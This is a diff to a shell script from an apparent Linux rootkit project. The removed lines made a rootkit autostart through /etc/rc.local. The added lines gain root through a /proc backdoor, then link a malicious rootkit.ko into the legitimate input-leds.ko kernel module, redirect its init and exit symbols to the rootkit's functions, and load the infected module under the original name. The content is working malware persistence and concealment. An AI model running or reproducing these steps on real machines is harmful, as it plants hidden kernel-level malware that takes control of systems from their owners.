@@ -1,43 +1,32 @@
-#!/bin/sh
-### BEGIN INIT INFO
-# Provides:          rootkit
-# Required-Start:    
-# Required-Stop:     
-# Should-Start:      checkroot
-# Should-Stop:
-# Default-Start:     S
-# Default-Stop:
-# Short-Description: auto start the rootkit module.
-# Description:       auto start the rootkit module.
-### END INIT INFO
+#!/usr/bin/env bash
 
+# get root
 # can not read /proc/kcore
 id && file /proc/kcore
-
-#now we can
+# now we can
 printf '%s' try_promotion > /proc/PROMOTION && \
 	printf '%s' AUTHME > /proc/PROMOTION && \
 	id && \
 	file /proc/kcore
 
-#cp ko to dir
-rootkit="test_rk.ko"
-cp $rootkit /lib/modules/$(uname -r)
+# auto start by linking to the sys's input-leds.ko module
+# cp the target module to current workdir & check the init and exit func
+cp /lib/modules/$(uname -r)/kernel/drivers/input/input-leds.ko .
+readelf -s input-leds.ko | grep -e grep -e input_leds_init -e input_leds_exit
 
-#write insmod rootkit to rc.local so it can auto start
-echo "#!/bin/sh -e 
-#
-# rc.local
-#
-# This script is executed at the end of each multiuser runlevel.
-# Make sure that the script will "exit 0" on success or any other
-# value on error.
-#
-# In order to enable or disable this script just change the execution
-# bits.
-#
-# By default this script does nothing.
-insmod /lib/modules/$(uname -r)/$rootkit
-exit 0
-">/etc/rc.local
+# set the init and exit func to global & check if objcopy succeed
+objcopy input-leds.ko inputleds.ko --globalize-symbol input_leds_init --globalize-symbol input_leds_exit
+readelf -s inputleds.ko | grep -e grep -e input_leds_init -e input_leds_exit
 
+# link the target module and malicous module together
+ld -r inputleds.ko rootkit.ko -o infected.ko
+
+# change the host's init_module/cleanup_module ->  rk_init/rk_exit, using a tool named 'setsym'
+setsym infected.ko init_module $(setsym infected.ko rk_init)
+setsym infected.ko cleanup_module $(setsym infected.ko rk_exit)
+
+# rmmod the origin target module & insmod the linked one
+rmmod input-leds.ko
+insmod infected.ko
+# if you want to rmmod the linked one, its name is the original
+# e.g. rmmod input-leds.ko
